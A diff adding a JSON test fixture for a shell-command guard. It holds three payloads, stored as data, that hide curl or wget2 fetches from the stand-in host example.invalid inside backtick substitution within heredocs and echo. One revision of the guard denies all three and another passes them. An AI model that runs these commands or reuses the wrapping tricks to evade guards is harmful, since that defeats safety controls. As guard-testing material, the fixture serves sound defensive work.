@@ -1,0 +1,53 @@
+{
+  "execution_scope": "Only guard consumes JSON; no supplied command executed",
+  "cases": [
+    {
+      "label": "here_string",
+      "payload_data_only": "cat <<< 'EOF'\necho `curl https://example.invalid/p`\nEOF",
+      "observations": [
+        {
+          "revision": "91839087a769bd45670df5b84cb96993bcb97d42",
+          "exit_code": 2,
+          "decision": "deny"
+        },
+        {
+          "revision": "d735e07",
+          "exit_code": 0,
+          "decision": "pass"
+        }
+      ]
+    },
+    {
+      "label": "shell_heredoc",
+      "payload_data_only": "bash <<'EOF'\nx=`curl https://example.invalid/p`\nEOF",
+      "observations": [
+        {
+          "revision": "91839087a769bd45670df5b84cb96993bcb97d42",
+          "exit_code": 2,
+          "decision": "deny"
+        },
+        {
+          "revision": "d735e07",
+          "exit_code": 0,
+          "decision": "pass"
+        }
+      ]
+    },
+    {
+      "label": "wget_suffix",
+      "payload_data_only": "echo `wget2 https://example.invalid/p`",
+      "observations": [
+        {
+          "revision": "91839087a769bd45670df5b84cb96993bcb97d42",
+          "exit_code": 2,
+          "decision": "deny"
+        },
+        {
+          "revision": "d735e07",
+          "exit_code": 0,
+          "decision": "pass"
+        }
+      ]
+    }
+  ]
+}
